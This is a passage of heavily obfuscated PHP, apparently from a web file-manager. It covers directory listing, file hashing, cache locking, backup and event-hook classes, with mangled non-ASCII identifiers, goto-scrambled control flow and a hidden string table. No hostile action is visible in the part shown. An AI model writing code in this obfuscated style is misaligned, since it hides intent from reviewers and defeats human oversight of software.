$BÎ˜Îæ◊ˆ« = array($C©ãÊØ⁄∑≤[83] => array(), $C©ãÊØ⁄∑≤[82] => array()); if (!($d“Ïú≤·•ù = @opendir($C”‘›∞ÑøŒ))) { return $BÎ˜Îæ◊ˆ«; } while (($Eƒéâ¥Àúå = readdir($d“Ïú≤·•ù)) !== !1) { if ($Eƒéâ¥Àúå == $C©ãÊØ⁄∑≤[98] || $Eƒéâ¥Àúå == $C©ãÊØ⁄∑≤[871]) { continue; } $eÿ‰∆â–£Ó = $C”‘›∞ÑøŒ . $Eƒéâ¥Àúå; if (is_file($eÿ‰∆â–£Ó)) { $BÎ˜Îæ◊ˆ«[$C©ãÊØ⁄∑≤[82]][] = $this->fileInfo($eÿ‰∆â–£Ó, $d”ë‘ø÷ı¨); } else { $BÎ˜Îæ◊ˆ«[$C©ãÊØ⁄∑≤[83]][] = $this->folderInfo($eÿ‰∆â–£Ó, $dÈœΩ◊≠ôÎ, $d”ë‘ø÷ı¨); } } goto C•ﬁÈ◊ò∆¥; cœÉæ•àíü: $C©ãÊØ⁄∑≤ =& $_SERVER[∞„˜ƒÑºª]; $C”‘›∞ÑøŒ = $this->iconvSystem($C”‘›∞ÑøŒ); $C”‘›∞ÑøŒ = rtrim($C”‘›∞ÑøŒ, $C©ãÊØ⁄∑≤[8]) . $C©ãÊØ⁄∑≤[8]; goto aîÈë»Ñ÷“; Eî‡ãàñã›: } public function listAll($câÑÛ®œòì, &$c«å®—â∆∏ = array()) { goto dõëäƒÇâç; bÉ÷ç“Û≈æ: if (!($C’º÷œÈ£ç = @opendir($câÑÛ®œòì))) { return $c«å®—â∆∏; } while (($C°ÍòÖí©ç = readdir($C’º÷œÈ£ç)) !== !1) { if ($C°ÍòÖí©ç == $båÛÔú∂Õ€[98] || $C°ÍòÖí©ç == $båÛÔú∂Õ€[871]) { continue; } $Fú≥â¡ı®à = $câÑÛ®œòì . $C°ÍòÖí©ç; if (is_dir($Fú≥â¡ı®à)) { $c«å®—â∆∏[] = array($båÛÔú∂Õ€[84] => $Fú≥â¡ı®à . $båÛÔú∂Õ€[8], $båÛÔú∂Õ€[85] => 1, $båÛÔú∂Õ€[86] => 0); $this->listAll($Fú≥â¡ı®à, $c«å®—â∆∏); } else { $c«å®—â∆∏[] = array($båÛÔú∂Õ€[84] => $Fú≥â¡ı®à, $båÛÔú∂Õ€[85] => 0, $båÛÔú∂Õ€[86] => $this->size($Fú≥â¡ı®à)); } } closedir($C’º÷œÈ£ç); goto EûÔáí„óì; dõëäƒÇâç: $båÛÔú∂Õ€ =& $_SERVER[∞„˜ƒÑºª]; $câÑÛ®œòì = $this->iconvSystem($câÑÛ®œòì); $câÑÛ®œòì = rtrim($câÑÛ®œòì, $båÛÔú∂Õ€[8]) . $båÛÔú∂Õ€[8]; goto bÉ÷ç“Û≈æ; EûÔáí„óì: return $c«å®—â∆∏; goto EÂçä∏¥≈; EÂçä∏¥≈: } public function has($d——…ÒîÁ›, $DÊ Ç÷Ì©» = true) { goto F™ÍÑ›ÑÙã; Aù«Üü±ÔÛ: return !1; goto F∫ºÙë‹úë; F™ÍÑ›ÑÙã: $E°Á≈éû‹ø =& $_SERVER[∞„˜ƒÑºª]; $d——…ÒîÁ› = $this->iconvSystem($d——…ÒîÁ›); $d——…ÒîÁ› = rtrim($d——…ÒîÁ›, $E°Á≈éû‹ø[8]) . $E°Á≈éû‹ø[8]; goto aï∆†¨£‘ö; aï∆†¨£‘ö: if (!($dÀâ¿Ê¬° = @opendir($d——…ÒîÁ›))) { return !1; } while (($bÌ≠ö–ñ®À = readdir($dÀâ¿Ê¬°)) !== !1) { if ($bÌ≠ö–ñ®À == $E°Á≈éû‹ø[98] || $bÌ≠ö–ñ®À == $E°Á≈éû‹ø[871]) { continue; } $Eû¯ö‰‡À˜ = $d——…ÒîÁ› . $bÌ≠ö–ñ®À; if ($DÊ Ç÷Ì©») { if (@is_file($Eû¯ö‰‡À˜)) { return !0; } } else { if (@is_dir($Eû¯ö‰‡À˜ . $E°Á≈éû‹ø[8])) { return !0; } } } closedir($dÀâ¿Ê¬°); goto Aù«Üü±ÔÛ; F∫ºÙë‹úë: } public function hashSimple($BÑ»¶Øµæ) { goto fÇÏ∆ƒÜ»ø; DëìÇıæÆ: fseek($e”⁄îıë”Ö, $CÇ°≠¨¥Œü - $Cûàúœ¢°—); $a¡∏Æ¯ÇØΩ .= fread($e”⁄îıë”Ö, $Cûàúœ¢°—); fclose($e”⁄îıë”Ö); goto Fˆ∏É®≤´‡; C∑Ù‡»±ÿµ: $CÇ°≠¨¥Œü = $this->size($BÑ»¶Øµæ); $Cûàúœ¢°— = 200; $C£îÂÊÓàª = 50; goto BΩ∞¥ıüÈâ; BΩ∞¥ıüÈâ: if ($CÇ°≠¨¥Œü <= $Cûàúœ¢°— * $C£îÂÊÓàª) { return $this->hashMd5($BÑ»¶Øµæ) . $CÇ°≠¨¥Œü; } $a¡∏Æ¯ÇØΩ = $dâ»∏ÁæØ™[33]; $FéâÜ†É¨ = intval($CÇ°≠¨¥Œü / $C£îÂÊÓàª); goto e˜ûÃÚ±Êë; fÇÏ∆ƒÜ»ø: $dâ»∏ÁæØ™ =& $_SERVER[∞„˜ƒÑºª]; if (!$BÑ»¶Øµæ) { return md5($dâ»∏ÁæØ™[33]); } $BÑ»¶Øµæ = $this->iconvSystem($BÑ»¶Øµæ); goto C∑Ù‡»±ÿµ; Fˆ∏É®≤´‡: return md5($a¡∏Æ¯ÇØΩ) . $CÇ°≠¨¥Œü; goto cìµÏÿãÖ´; e˜ûÃÚ±Êë: $e”⁄îıë”Ö = fopen($BÑ»¶Øµæ, $dâ»∏ÁæØ™[875]); if (!$e”⁄îıë”Ö) { return $a¡∏Æ¯ÇØΩ; } for ($C’ ÃÂ´ùﬁ = 0; $C’ ÃÂ´ùﬁ < $C£îÂÊÓàª; $C’ ÃÂ´ùﬁ++) { fseek($e”⁄îıë”Ö, $FéâÜ†É¨ * $C’ ÃÂ´ùﬁ); $a¡∏Æ¯ÇØΩ .= fread($e”⁄îıë”Ö, $Cûàúœ¢°—); } goto DëìÇıæÆ; cìµÏÿãÖ´: } public function getContent($cã´ªﬁêã≤) { $cã´ªﬁêã≤ = $this->iconvSystem($cã´ªﬁêã≤); return file_get_contents($cã´ªﬁêã≤); } public function setContent($a„ÖÃëë§ô, $B‡á¿€¥Í± = '') { $a„ÖÃëë§ô = $this->iconvSystem($a„ÖÃëë§ô); return file_put_contents($a„ÖÃëë§ô, $B‡á¿€¥Í±, LOCK_EX); } public function fileSubstr($DÛ◊Ï≠ô ◊, $c∑‡”¬Öûç = 0, $EÍê–÷ΩÈî = false) { goto a˘≤àß»ﬂŒ; a˘≤àß»ﬂŒ: $fíçÁ«Œœ‡ =& $_SERVER[∞„˜ƒÑºª]; $DÛ◊Ï≠ô ◊ = $this->iconvSystem($DÛ◊Ï≠ô ◊); if ($EÍê–÷ΩÈî === !1) { $EÍê–÷ΩÈî = $this->size($DÛ◊Ï≠ô ◊); } goto B´—©Êù–Ì; còÆ”ó†ø´: return $b”™±Ê∆Áé; goto EáãÒÃ£‰Ï; B´—©Êù–Ì: if ($EÍê–÷ΩÈî <= 0) { return $fíçÁ«Œœ‡[33]; } $a˜ÉïÛ‡Ãâ = fopen($DÛ◊Ï≠ô ◊, $fíçÁ«Œœ‡[875]); if (!$a˜ÉïÛ‡Ãâ) { return !1; } goto DìöÛ€Íã©; DìöÛ€Íã©: fseek($a˜ÉïÛ‡Ãâ, $c∑‡”¬Öûç); $b”™±Ê∆Áé = fread($a˜ÉïÛ‡Ãâ, $EÍê–÷ΩÈî); fclose($a˜ÉïÛ‡Ãâ); goto còÆ”ó†ø´; EáãÒÃ£‰Ï: } public function upload($e£–ÁŒ˜±ê, $F Æé¨çΩñ, $d’”∞“…≥ò = false, $D¿ê⁄óïï = REPEAT_REPLACE) { $EëßÏπ⁄Ÿ¯ = $this->copyFile($F Æé¨çΩñ, $e£–ÁŒ˜±ê); return $EëßÏπ⁄Ÿ¯ ? $this->getPathOuter($e£–ÁŒ˜±ê) : !1; } public function download($D∑Ç—Àøèû, $cÎÛäã⁄Ìã) { return $this->iconvSystem($D∑Ç—Àøèû); } } goto Fÿ±£Œøøµ; c›∫Û¨©Ñ“: class CacheLockRedis { public function lock($EıÜ÷Ω¯Úü, $FÕ√ÈÉ¢¡å = 10) { $b»–¨üÉóø = Cache::init(); $c¥öíó“âå = microtime(!0) + $FÕ√ÈÉ¢¡å; while (microtime(!0) < $c¥öíó“âå) { $b≈≥∫ÉÈΩÓ = $b»–¨üÉóø->get($EıÜ÷Ω¯Úü); if (!$b≈≥∫ÉÈΩÓ) { $FÉÁ‚Ãñ∫Ã = $b»–¨üÉóø->setLock($EıÜ÷Ω¯Úü, $c¥öíó“âå, $FÕ√ÈÉ¢¡å); if ($FÉÁ‚Ãñ∫Ã) { return !0; } } else { if ($b≈≥∫ÉÈΩÓ < microtime(!0)) { $b»–¨üÉóø->set($EıÜ÷Ω¯Úü, $c¥öíó“âå, $c¥öíó“âå); if ($b»–¨üÉóø->get($EıÜ÷Ω¯Úü) === $b≈≥∫ÉÈΩÓ) { return !0; } } } cacheLockWait(); } return !1; } public function unlock($düÔ‰Ñ∆äπ) { $d ∫ﬁÍû∆â = Cache::init(); $d ∫ﬁÍû∆â->remove($düÔ‰Ñ∆äπ); } } class CacheLockMemcached { public function lock($AäÃ¡Ó∂ÃÛ, $EÓïáõ‡Óã = 0) { $B∑à´·íŒÛ = Cache::init(); $DËΩ˘ˆƒÉœ = microtime(!0) + $EÓïáõ‡Óã; while (microtime(!0) < $DËΩ˘ˆƒÉœ) { $aô®ÆËù∑ƒ = $B∑à´·íŒÛ->get($AäÃ¡Ó∂ÃÛ); if (!$aô®ÆËù∑ƒ || $aô®ÆËù∑ƒ < microtime(!0)) { $aúêÉëÉ¥Ø = $B∑à´·íŒÛ->handle->add($AäÃ¡Ó∂ÃÛ, $DËΩ˘ˆƒÉœ, $EÓïáõ‡Óã); if ($aúêÉëÉ¥Ø) { return !0; } } cacheLockWait(); } return !1; } public function unlock($E¶êå≥“ÖÍ) { $bıÚ≤òãÿº = Cache::init(); $bıÚ≤òãÿº->remove($E¶êå≥“ÖÍ); } } class CacheLockDatabase { public function lock($E∂Óﬂ¬¬„É, $eèø•ç∞ä˘ = 0) { $CÏ£ôáçèñ = Model($_SERVER[∞„˜ƒÑºª][523]); $C™ÊìÑÖ¡÷ = microtime(!0) + $eèø•ç∞ä˘; while (microtime(!0) < $C™ÊìÑÖ¡÷) { $cÜ±‰æÍÔ¯ = $CÏ£ôáçèñ->get($E∂Óﬂ¬¬„É); if (!$cÜ±‰æÍÔ¯ || $cÜ±‰æÍÔ¯ < microtime(!0)) { $E©ôﬁıÉï“ = $CÏ£ôáçèñ->set($E∂Óﬂ¬¬„É, $C™ÊìÑÖ¡÷); if ($E©ôﬁıÉï“) { return !0; } } cacheLockWait(); } return !1; } public function unlock($bÑ¥¬†É”ú) { Model($_SERVER[∞„˜ƒÑºª][523])->remove($bÑ¥¬†É”ú); } } goto b¬”—®Æûı; a®ã‹≠´õÉ: class BackupFile { public function __construct() { } public function index() { goto DÇËê‹ﬁÖá; DÇËê‹ﬁÖá: $C·àèë∑÷Ù = Backup::get(); $b÷≈¿ÙÙ›ﬁ = $C·àèë∑÷Ù[$_SERVER[∞„˜ƒÑºª][280]][$_SERVER[∞„˜ƒÑºª][163]][$_SERVER[∞„˜ƒÑºª][382]]; $c¶Û≥£ıô¯ = array($_SERVER[∞„˜ƒÑºª][390] => array($_SERVER[∞„˜ƒÑºª][502], $b÷≈¿ÙÙ›ﬁ), $_SERVER[∞„˜ƒÑºª][503] => array($_SERVER[∞„˜ƒÑºª][318], $C·àèë∑÷Ù[$_SERVER[∞„˜ƒÑºª][447]])); goto Dèëê““¶±; D©Œ‹˘õº≈: $aú∏ËΩÊ·…->end(); $Fâ˘òô≈«Æ = array($_SERVER[∞„˜ƒÑºª][518] => 1, $_SERVER[∞„˜ƒÑºª][459] => time(), $_SERVER[∞„˜ƒÑºª][465] => 1, $_SERVER[∞„˜ƒÑºª][515] => $b÷≈¿ÙÙ›ﬁ, $_SERVER[∞„˜ƒÑºª][507] => $D“†Ñﬂ·¶ï, $_SERVER[∞„˜ƒÑºª][506] => $F≤Ü§Û» ﬁ); if ($e¡ä¬£ª¢∞) { $Fâ˘òô≈«Æ[$_SERVER[∞„˜ƒÑºª][516]] = $a≤Œ«•Ã¯´; $Fâ˘òô≈«Æ[$_SERVER[∞„˜ƒÑºª][517]] = $cª⁄™™∂Õ…; } goto FØ‚üõê¢á; F±åÇ∫í⁄’: $FπœÈΩ∆—π = array(); $cª⁄™™∂Õ… = $a≤Œ«•Ã¯´ = 0; do { $C·ïé≠ëﬂ÷ = $_SERVER[∞„˜ƒÑºª][508]; $b‘Ó≥ﬁÈ¡ç = Model($_SERVER[∞„˜ƒÑºª][478])->where($c¶Û≥£ıô¯)->field($C·ïé≠ëﬂ÷)->order($_SERVER[∞„˜ƒÑºª][509])->selectPage($eûß¶‘˜˜±, $AÛë©ÍÊ·†); $a±ãŒø›¨ì = !empty($b‘Ó≥ﬁÈ¡ç[$_SERVER[∞„˜ƒÑºª][354]]) ? $b‘Ó≥ﬁÈ¡ç[$_SERVER[∞„˜ƒÑºª][354]] : array(); foreach ($a±ãŒø›¨ì as $aÛıä–‡Ê¢) { goto A‡”„›†§Ö; A‡”„›†§Ö: if (!$this->_fileExist($aÛıä–‡Ê¢, $FπœÈΩ∆—π)) { $F≤Ü§Û» ﬁ -= 1; $D“†Ñﬂ·¶ï -= (int) $aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][86]]; write_log("\x66\151\154\x65\40\x6e\x6f\164\40\x65\x78\x69\163\x74\56\x66\x69\154\x65\111\x44\72{$aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][382]]}\54\x20\160\x61\164\150\72{$aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][84]]}", $_SERVER[∞„˜ƒÑºª][510]); continue; } $Dƒ—Õˆ≤ﬂ© = $aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][84]]; $c∞„¥´††– = str_replace("\x7b\151\x6f\72{$aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][479]]}\x7d", "\173\x69\157\x3a{$C·àèë∑÷Ù[$_SERVER[∞„˜ƒÑºª][447]]}\175", $Dƒ—Õˆ≤ﬂ©); goto cüﬁå»⁄ıÀ; cÚÇë–õ™™: if ($Aﬂ≥´∂ù‰œ >= 1024 * 1024 * 50) { $Fâ˘òô≈«Æ = array($_SERVER[∞„˜ƒÑºª][515] => $b÷≈¿ÙÙ›ﬁ, $_SERVER[∞„˜ƒÑºª][516] => $a≤Œ«•Ã¯´, $_SERVER[∞„˜ƒÑºª][517] => $cª⁄™™∂Õ…); Backup::set($Fâ˘òô≈«Æ); $Aﬂ≥´∂ù‰œ = $e¡ä¬£ª¢∞ = 0; } goto C√œ´öíµÔ; cüﬁå»⁄ıÀ: if (IO::exist($c∞„¥´††–)) { $aú∏ËΩÊ·…->updateFileEnd($aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][28]], $aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][86]]); } else { if (!IO::copy($Dƒ—Õˆ≤ﬂ©, $c∞„¥´††–, $_SERVER[∞„˜ƒÑºª][511])) { write_log($_SERVER[∞„˜ƒÑºª][512] . $Dƒ—Õˆ≤ﬂ© . $_SERVER[∞„˜ƒÑºª][513] . $c∞„¥´††– . $_SERVER[∞„˜ƒÑºª][514] . $aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][28]], $_SERVER[∞„˜ƒÑºª][467]); continue; } } $b÷≈¿ÙÙ›ﬁ = $aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][382]]; $e¡ä¬£ª¢∞ += 1; goto BÎ†∑Ò◊Ú∏; BÎ†∑Ò◊Ú∏: $Aﬂ≥´∂ù‰œ += $aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][86]]; $a≤Œ«•Ã¯´ += 1; $cª⁄™™∂Õ… += $aÛıä–‡Ê¢[$_SERVER[∞„˜ƒÑºª][86]]; goto cÚÇë–õ™™; C√œ´öíµÔ: } $BπøïéÕ’’ = count($a±ãŒø›¨ì); $AÛë©ÍÊ·†++; } while ($BπøïéÕ’’ == $eûß¶‘˜˜±); goto D©Œ‹˘õº≈; F°◊øÇ£ÆÆ: $aú∏ËΩÊ·…->task[$_SERVER[∞„˜ƒÑºª][454]] = $D“†Ñﬂ·¶ï; $Fâ˘òô≈«Æ = array($_SERVER[∞„˜ƒÑºª][506] => $F≤Ü§Û» ﬁ, $_SERVER[∞„˜ƒÑºª][507] => $D“†Ñﬂ·¶ï); Backup::set($Fâ˘òô≈«Æ); goto C‰ïñ†Î»ó; FØ‚üõê¢á: Backup::set($Fâ˘òô≈«Æ); $this->_fileFilter($FπœÈΩ∆—π); return !0; goto EÂ·»àÏÜ¢; Dèëê““¶±: $F≤Ü§Û» ﬁ = (int) Model($_SERVER[∞„˜ƒÑºª][478])->where($c¶Û≥£ıô¯)->count($_SERVER[∞„˜ƒÑºª][382]); $D“†Ñﬂ·¶ï = (int) Model($_SERVER[∞„˜ƒÑºª][478])->where($c¶Û≥£ıô¯)->sum($_SERVER[∞„˜ƒÑºª][86]); $aú∏ËΩÊ·… = new TaskFileTransfer($_SERVER[∞„˜ƒÑºª][504], $_SERVER[∞„˜ƒÑºª][467], $F≤Ü§Û» ﬁ, LNG($_SERVER[∞„˜ƒÑºª][468]) . $_SERVER[∞„˜ƒÑºª][469] . LNG($_SERVER[∞„˜ƒÑºª][505])); goto F°◊øÇ£ÆÆ; C‰ïñ†Î»ó: $AÛë©ÍÊ·† = 1; $eûß¶‘˜˜± = 1000; $Aﬂ≥´∂ù‰œ = $e¡ä¬£ª¢∞ = 0; goto F±åÇ∫í⁄’; EÂ·»àÏÜ¢: } private function _fileExist($EûˆﬁÊˆ≥¨, &$D¶Úª Ωù€) { goto bΩ∂¢ó÷≥ﬁ; Aßﬂ´ô…ñÚ: return !1; goto Eôø‚¶âß; f•™—Öˆìı: if (IO::exist($f¿ƒ°¬îâÎ)) { return !0; } $Dä≥›´£äº = get_path_father($f¿ƒ°¬îâÎ); if (IO::exist($Dä≥›´£äº)) { $D¶Úª Ωù€[] = $EûˆﬁÊˆ≥¨[$Bë‘™é”ãè[382]]; return !1; } goto aß¶◊ÑÉóÓ; aß¶◊ÑÉóÓ: $EùªÂé≤Î¿ = array($Bë‘™é”ãè[479] => $EûˆﬁÊˆ≥¨[$Bë‘™é”ãè[479]], $Bë‘™é”ãè[84] => array($Bë‘™é”ãè[519], "{$Dä≥›´£äº}\45")); $d·¨¥ÚäÍ⁄ = Model($Bë‘™é”ãè[478])->where($EùªÂé≤Î¿)->field($Bë‘™é”ãè[390])->select(); $D¶Úª Ωù€ = array_merge($D¶Úª Ωù€, array_to_keyvalue($d·¨¥ÚäÍ⁄, $Bë‘™é”ãè[33], $Bë‘™é”ãè[382])); goto Aßﬂ´ô…ñÚ; bΩ∂¢ó÷≥ﬁ: $Bë‘™é”ãè =& $_SERVER[∞„˜ƒÑºª]; $f¿ƒ°¬îâÎ = $EûˆﬁÊˆ≥¨[$Bë‘™é”ãè[84]]; if (in_array($EûˆﬁÊˆ≥¨[$Bë‘™é”ãè[382]], $D¶Úª Ωù€)) { return !1; } goto f•™—Öˆìı; Eôø‚¶âß: } private function _fileFilter($dœç·ä´úœ) { $Dø…ùœ«ﬁ¬ =& $_SERVER[∞„˜ƒÑºª]; if (empty($dœç·ä´úœ)) { return; } $E±Â›ËöÕµ = array($Dø…ùœ«ﬁ¬[382] => array($Dø…ùœ«ﬁ¬[7], array_unique($dœç·ä´úœ))); $d◊À§ÇÆ“œ = Model($Dø…ùœ«ﬁ¬[520])->where($E±Â›ËöÕµ)->field($Dø…ùœ«ﬁ¬[374])->select(); foreach ($d◊À§ÇÆ“œ as $B¬Õ∂Û◊–◊) { Model($Dø…ùœ«ﬁ¬[520])->remove($B¬Õ∂Û◊–◊[$Dø…ùœ«ﬁ¬[374]], !1); } } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto A∏°⁄˜˘∏π; A∏°⁄˜˘∏π: $eçøŒÁúêÉ =& $_SERVER[∞„˜ƒÑºª]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Aµô‰≥ÜàÂ; Aµô‰≥ÜàÂ: $eÃﬁ∑ìÍ¡‰ = $GLOBALS[$eçøŒÁúêÉ[6]][$eçøŒÁúêÉ[336]]; $fŒîﬁÔ™úŸ = $eÃﬁ∑ìÍ¡‰[$eÃﬁ∑ìÍ¡‰[$eçøŒÁúêÉ[521]]]; $a’·¬ƒÙÆä = $eÃﬁ∑ìÍ¡‰[$eçøŒÁúêÉ[522]]; goto CñÜË…Ÿ∑Ù; CñÜË…Ÿ∑Ù: switch ($eÃﬁ∑ìÍ¡‰[$eçøŒÁúêÉ[521]]) { case $eçøŒÁúêÉ[17]: self::$handle = Model($eçøŒÁúêÉ[523]); break; case $eçøŒÁúêÉ[524]: self::$handle = new CacheRedis($fŒîﬁÔ™úŸ, $a’·¬ƒÙÆä); break; case $eçøŒÁúêÉ[525]: self::$handle = new CacheMemcached($fŒîﬁÔ™úŸ, $a’·¬ƒÙÆä); break; case $eçøŒÁúêÉ[163]: self::$handle = new CacheFile($fŒîﬁÔ™úŸ, $a’·¬ƒÙÆä); break; default: break; } return self::$handle; goto B§øê·ûä£; B§øê·ûä£: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($fâ—äÁÏ¶Â) { if (is_array($fâ—äÁÏ¶Â) || is_object($fâ—äÁÏ¶Â)) { $fâ—äÁÏ¶Â = json_encode($fâ—äÁÏ¶Â); } return KOD_SITE_ID . $_SERVER[∞„˜ƒÑºª][79] . $fâ—äÁÏ¶Â; } public static function get($A¯æ≠¶ñÒı) { $A¯æ≠¶ñÒı = self::key($A¯æ≠¶ñÒı); if (!isset(self::$memoryCache[$A¯æ≠¶ñÒı])) { CacheLock::lock($A¯æ≠¶ñÒı); $F›°èö‘Ü‰ = self::init()->get($A¯æ≠¶ñÒı); CacheLock::unlock($A¯æ≠¶ñÒı); self::$memoryCache[$A¯æ≠¶ñÒı] = unserialize($F›°èö‘Ü‰); } return self::$memoryCache[$A¯æ≠¶ñÒı]; } public static function set($EÏåáøËß¨, $fææôﬁëƒ∫, $d∏¨ô€´©® = false) { goto DΩﬁ√ƒ‹¶Û; fÕø˜åﬂﬁ∂: CacheLock::lock($EÏåáøËß¨); $c⁄ë≠·…µø = self::init()->set($EÏåáøËß¨, serialize($fææôﬁëƒ∫), $d∏¨ô€´©®); self::$memoryCache[$EÏåáøËß¨] = $fææôﬁëƒ∫; goto e–Ó≤∆Ü≈π; e–Ó≤∆Ü≈π: CacheLock::unlock($EÏåáøËß¨); return $c⁄ë≠·…µø; goto b“„Úàæ©“; DΩﬁ√ƒ‹¶Û: $EÏåáøËß¨ = self::key($EÏåáøËß¨); if (isset(self::$memoryCache[$EÏåáøËß¨]) && self::$memoryCache[$EÏåáøËß¨] === $fææôﬁëƒ∫) { return !0; } if ($d∏¨ô€´©® === 0) { self::$memoryCache[$EÏåáøËß¨] = $fææôﬁëƒ∫; return !0; } goto fÕø˜åﬂﬁ∂; b“„Úàæ©“: } public static function remove($dÆ…ó≈ó•ì) { goto Añ©¬ΩŒ±‘; dΩÇç‹ªÁÖ: CacheLock::lock($dÆ…ó≈ó•ì); $F“á“ﬂ§æö = self::init()->remove($dÆ…ó≈ó•ì); CacheLock::unlock($dÆ…ó≈ó•ì); goto CÔ™‡¡ú¿£; Añ©¬ΩŒ±‘: $dÆ…ó≈ó•ì = self::key($dÆ…ó≈ó•ì); unset(self::$memoryCache[$dÆ…ó≈ó•ì]); self::clearTimeout(); goto dΩÇç‹ªÁÖ; CÔ™‡¡ú¿£: return $F“á“ﬂ§æö; goto E•Ÿ¯Ñú¢ï; E•Ÿ¯Ñú¢ï: } public static function clearMemory($DÓµ¶Öº≥Í = false) { if ($DÓµ¶Öº≥Í) { $DÓµ¶Öº≥Í = self::key($DÓµ¶Öº≥Í); unset(self::$memoryCache[$DÓµ¶Öº≥Í]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[∞„˜ƒÑºª][526])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[∞„˜ƒÑºª][527])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($f¡ü≈≈·‘∑, $D”Ïíµ«ŒÒ) { $A¯–Âéúè» =& $_SERVER[∞„˜ƒÑºª]; $this->cachePath = $f¡ü≈≈·‘∑[$A¯–Âéúè»[84]]; $this->prefix = $A¯–Âéúè»[528]; $this->cacheTime = $D”Ïíµ«ŒÒ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($c‘⁄ãà÷é) { $a®¯èå§´ù =& $_SERVER[∞„˜ƒÑºª]; $c‘⁄ãà÷é = str_replace(array($a®¯èå§´ù[494], $a®¯èå§´ù[100], $a®¯èå§´ù[78]), $a®¯èå§´ù[529], $c‘⁄ãà÷é); return $this->cachePath . $a®¯èå§´ù[530] . $c‘⁄ãà÷é . $a®¯èå§´ù[531]; } public function set($c ©—ÓÚÙ√, $b‚‡ÑæÀÂŒ, $b©Öå◊æî‰ = false) { $f´∞Â∞ÕÖÖ = $this->getFile($c ©—ÓÚÙ√); if (file_put_contents($f´∞Â∞ÕÖÖ, $this->prefix . $b‚‡ÑæÀÂŒ, LOCK_EX)) { return !0; } @unlink($f´∞Â∞ÕÖÖ); return !1; } public function get($D∂≥ü‡àäœ) { $eÁ®’´ºÀƒ = $this->getFile($D∂≥ü‡àäœ); if (file_exists($eÁ®’´ºÀƒ) && filemtime($eÁ®’´ºÀƒ) < time() - $this->cacheTime) { @unlink($eÁ®’´ºÀƒ); return !1; } $bé◊èπ–áè = @file_get_contents($eÁ®’´ºÀƒ); return substr($bé◊èπ–áè, strlen($this->prefix)); } public function remove($e‹¡«Êæã£) { $Eûœ°ı∞‚ë = $this->getFile($e‹¡«Êæã£); return @unlink($Eûœ°ı∞‚ë); } public function deleteAll() { $B‹â≤èÖΩ¯ =& $_SERVER[∞„˜ƒÑºª]; $EÉ™»Æñ—ª = scandir($this->cachePath); foreach ($EÉ™»Æñ—ª as $BãƒªˆØÂÓ) { $aôâ˜Â≠ıü = $this->cachePath . $BãƒªˆØÂÓ; if (strpos($aôâ˜Â≠ıü, $B‹â≤èÖΩ¯[531]) && strpos($aôâ˜Â≠ıü, $B‹â≤èÖΩ¯[532])) { @unlink($aôâ˜Â≠ıü); } } } public function clearTimeout() { $d¶áØúÒÇ¡ =& $_SERVER[∞„˜ƒÑºª]; $E≥ƒ´à≠ò‹ = scandir($this->cachePath); foreach ($E≥ƒ´à≠ò‹ as $Fßâ»êÛ‹©) { $fëº∑£êô« = $this->cachePath . $Fßâ»êÛ‹©; if (strpos($fëº∑£êô«, $d¶áØúÒÇ¡[531]) && strpos($fëº∑£êô«, $d¶áØúÒÇ¡[532]) && filemtime($fëº∑£êô«) < time() - $this->cacheTime) { @unlink($fëº∑£êô«); } } } } goto f€ªÖûÔåø; A»É€ÃÖ¿ß: class Hook { private static $events = array(); public static function get($D„ë˜Êèﬂì = false) { if (!$D„ë˜Êèﬂì) { return self::$events; } else { return self::$events[$D„ë˜Êèﬂì]; } } public static function apply($AØÈ†Ãêø◊, $Bıºœëâ≥‹ = array()) { $bí“∆πè¬ÿ = ActionApply($AØÈ†Ãêø◊, $Bıºœëâ≥‹); if (is_string($AØÈ†Ãêø◊)) { Hook::trigger($AØÈ†Ãêø◊); } return $bí“∆πè¬ÿ; } public static function bind($Cƒ—Ù˜’ﬂ∆, $BÈ‘ûëëéç, $dÿΩÃÃ∆®· = false) { $d—µ˜πë¨ñ =& $_SERVER[∞„˜ƒÑºª]; if (!isset(self::$events[$Cƒ—Ù˜’ﬂ∆])) { self::$events[$Cƒ—Ù˜’ﬂ∆] = array(); } self::$events[$Cƒ—Ù˜’ﬂ∆][] = array($d—µ˜πë¨ñ[1146] => $BÈ‘ûëëéç, $d—µ˜πë¨ñ[1147] => $dÿΩÃÃ∆®·, $d—µ˜πë¨ñ[1148] => 0); } public static function once($EÆÒ†∞¨∞Ù, $c∆çóáï‚¢) { self::bind($EÆÒ†∞¨∞Ù, $c∆çóáï‚¢, !0); } public static function unbind($bíõ†…·≈÷, $b”π•’µ†Ù = false) { if (!$b”π•’µ†Ù) { self::$events[$bíõ†…·≈÷] = array(); return; } $Cπ·å≤±ıé = self::$events[$bíõ†…·≈÷]; self::$events[$bíõ†…·≈÷] = array(); for ($DÓÚ‡ƒ»ëè = 0; $DÓÚ‡ƒ»ëè < count($Cπ·å≤±ıé); $DÓÚ‡ƒ»ëè++) { if ($Cπ·å≤±ıé[$DÓÚ‡ƒ»ëè][$_SERVER[∞„˜ƒÑºª][1146]] == $b”π•’µ†Ù) { continue; } self::$events[$bíõ†…·≈÷][] = $Cπ·å≤±ıé[$DÓÚ‡ƒ»ëè]; } } public static function filter($bÛô®∆™¶Ë, $fÑâè≥œÒ“) { goto f±º‡«¢œ˜; f±º‡«¢œ˜: $FÎß¶Ñ¨√‰ =& $_SERVER[∞„˜ƒÑºª]; $DÍ‚Ê¢„–› = self::$events; if (!isset($DÍ‚Ê¢„–›[$bÛô®∆™¶Ë])) { return $fÑâè≥œÒ“; } goto 